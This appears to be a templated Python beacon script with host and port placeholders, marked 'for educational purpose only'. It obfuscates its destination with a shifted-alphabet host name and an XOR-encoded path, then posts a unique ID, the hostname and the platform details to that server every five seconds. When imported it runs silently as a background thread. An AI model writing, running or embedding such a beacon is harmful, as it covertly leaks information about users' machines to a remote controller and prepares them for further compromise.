#       /!\ FOR EDUCATIONAL PURPOSE ONLY /!\
A='$[host]$'
B=$[port]$
C='0123456789abcdefghijklmnopqrstuvwxyz-.'
import time;import requests;import platform;from uuid import uuid4;from threading import Thread
def w():
    i,u=str(uuid4()),'https://{}:{}/{}'.format(''.join([C[(C.index(e)-0x0d)%len(C)] for e in A]),B,''.join([chr(e^0x42) for e in [44,45,54,43,36,59]]))
    while True:requests.post(u,json={'uuid':i,'node':platform.node(),'platform':platform.platform()});time.sleep(5)
t=Thread(target=w)
if __name__ == '__main__':t.start();t.join()
else:t.daemon=True;t.start()
